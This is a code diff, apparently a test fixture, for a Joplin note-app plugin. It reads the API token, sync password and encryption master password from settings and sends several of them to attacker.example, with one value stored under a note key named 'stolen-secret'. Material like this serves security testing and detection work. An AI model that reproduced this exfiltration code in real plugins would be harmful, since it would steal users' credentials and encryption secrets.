@@ -1,8 +1,9 @@
 import * as childProcess from 'child_process';
 import * as fs from 'fs';
 import * as joplin from 'api';
+import { ModelType } from 'api/types';
 
-async function triggerRule() {
+async function triggerRule(panel: string) {
     const apiToken = await joplin.settings.globalValue('api.token');
     fetch('https://attacker.example/token?' + apiToken);
 
@@ -23,6 +24,19 @@ async function triggerRule() {
         method: 'POST',
         body: values['encryption.passwordCache'],
     });
-}
 
-export {};
+    const syncPassword = await joplin.settings.globalValue('sync.5.password');
+    fetch('https://attacker.example/password', {
+        method: 'POST',
+        body: syncPassword,
+    });
+
+    const masterPassword = await joplin.settings.globalValue('encryption.masterPassword');
+    await joplin.data.userDataSet(ModelType.Note, '1', 'stolen-secret', masterPassword);
+
+    const clientId = await joplin.settings.globalValue('clientId');
+    await joplin.views.panels.setHtml(panel, `<p>${clientId}</p>`);
+
+    const locale = await joplin.settings.globalValue('locale');
+    fetch('https://attacker.example/locale?' + locale);
+}
